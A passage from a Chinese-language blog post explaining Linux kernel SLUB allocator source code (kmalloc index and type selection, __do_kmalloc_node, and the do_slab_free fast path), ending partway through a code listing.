KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-：获取size对应下标"><a href="#II-kmalloc-index-：获取size对应下标" class="headerlink" title="II. __kmalloc_index()：获取size对应下标"></a>II. __kmalloc_index()：获取size对应下标</h3><p><code>kmalloc_index()</code> 其实就是 <code>__kmalloc_index（）</code>，根据请求的大小返回对应的下标，整体逻辑非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 算出一个特定大小的分配属于哪个 kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 注意: __kmalloc_index() 在编译期优化, 没有运行时优化;</span><br><span class="hljs-comment"> * 典型的用法为通过 kmalloc_index() 以在编译期优化.</span><br><span class="hljs-comment"> * 大小非常量的调用者仅应当为__kmalloc_index()的运行时开销可以被接受的测试模块.</span><br><span class="hljs-comment"> * 同样参见 kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-：获取标志位对应类型"><a href="#III-kmalloc-types-：获取标志位对应类型" class="headerlink" title="III. kmalloc_types()：获取标志位对应类型"></a>III. kmalloc_types()：获取标志位对应类型</h3><p><code>kmalloc_type()</code> 其实主要就是根据标志位返回类型，除了指定了 <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> 以外就都是 <code>KMALLOC_NORMAL</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 最常规的情况为 KMALLOC_NORMAL, 所以用一个单独的分支测试所有相关的标志位.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 至少需要设置一种标志位. 优先顺序为:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配"><a href="#IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配" class="headerlink" title="IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配"></a>IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>kmalloc_trace()</code> 主要是对 <code>__kmem_cache_alloc_node()</code> 的 wrapper，加上 tracepoint 和 kasan 的相关设置，需要注意的是这里会指定 node 为 <code>NUMA_NO_NODE</code>：</p><blockquote><p>不知道什么是 kernel trace point 的可以参见 <a href="https://docs.kernel.org/trace/tracepoints.html">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> 其实就是 <code>slab_alloc_node()</code> 的 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配"><a href="#V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配" class="headerlink" title="V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配"></a>V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>__kmalloc()</code> 其实就是指定 node 为 <code> NUMA_NO_NODE</code> 的 <code>__do_kmalloc_node()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配"><a href="#VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配" class="headerlink" title="VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配"></a>VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配</h3><p>该函数的主要逻辑为：</p><ul><li>若 <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ，则调用 <code>__kmalloc_large_node()</code> 进行分配，并进行 tracepoint 与 kasan 相关设置</li><li>对于常规 size：<ul><li>首先调用 <code>kmalloc_slab()</code> 获取对应的 <code>kmem_cache</code></li><li>接下来调用 <code>__kmem_cache_alloc_node()</code> 进行内存分配</li><li>最后进行 tracepoint 与 kasan 相关设置</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> 中寻找 <code>kmem_cache</code> 的过程和 kmalloc 类似，不过寻找下标用的是 <code>size_index[size_index_elem(size)]</code> 和 <code>fls()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 寻找满足给定大小的分配的 kmem_cache 结构体</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> 和 <code>size_index_elem()</code> 的定义都非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图"><a href="#三、上层调用接口关系图" class="headerlink" title="三、上层调用接口关系图"></a>三、上层调用接口关系图</h2><p>因为很多比如说 <code>__kmem_cache_alloc_lru()</code> 一类的函数其实最后都是对 <code>slab_alloc_node()</code> 的套娃，这里笔者直接给出一个简易的调用关系图：</p><blockquote><p>只截取了笔者认为比较主要的那些，<del>因为作图作到后面实在蚌埠住了</del></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1 id="0x03-对象的释放"><a href="#0x03-对象的释放" class="headerlink" title="0x03. 对象的释放"></a>0x03. 对象的释放</h1><h2 id="※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）"><a href="#※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）" class="headerlink" title="※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）"></a>※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）</h2><p>在 slab allocator 中存在着多个不同的内存释放接口，其最后都会调用到 <code>do_slab_free()</code> 完成内存释放的工作，需要注意的是该函数  <em><strong>允许释放已经连接成一条 freelist 且已经加密好的多个对象</strong></em>  ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 强制内联快速路径以创造无需额外的函数调用便能完成快速路径释放的kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径仅在我们要释放会当前 cpu slab 时生效.</span><br><span class="hljs-comment"> * 这通常是在我们刚刚分配了该对象的情况.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若快速路径不可用则退回 __slab_free 以处理所有种类的特殊处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 通过指定 head &amp; tail 指针 加上对象数量（cnt），可以大量释放包含多个对象的freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>与分配类似，释放同样分为快速路径与慢速路径</p><h3 id="I-直接释放回-percpu-slab（fast-path）"><a href="#I-直接释放回-percpu-slab（fast-path）" class="headerlink" title="I. 直接释放回 percpu slab（fast path）"></a>I. 直接释放回 percpu slab（fast path）</h3><p>快速路径比较简单，主要就是<strong>对比待释放对象所属 slab 是否为 percpu slab，若是则直接挂回去即可，遵循 LIFO 机制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确定当前的 per cpu slab. </span><br><span class="hljs-comment"> * cpu 可能在之后改变.但由于数据已经通过该指针获得，这并没问题.</span><br><span class="hljs-comment"> * 若我们在 cmpxchg 期间在同一 cpu 上，释放将会成功.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* 与 slab_alloc_node() 中在 barrier() 上的注释一样 */</span><br>barrier();<br><br><span class="hljs-comment">// 不属于 percpu slab，调用 __slab_free() 进行释放</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-：释放回对应的-slab（slow-path）"><a href="#II-slab-free-：释放回对应的-slab（slow-path）" class="headerlink" title="II. __slab_free()：释放回对应的 slab（slow path）"></a>II. __slab_free()：释放回对应的 slab（slow path）</h3><p>如果待释放对象不属于 percpu clab，则调用 <code>__slab_free()</code> 进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 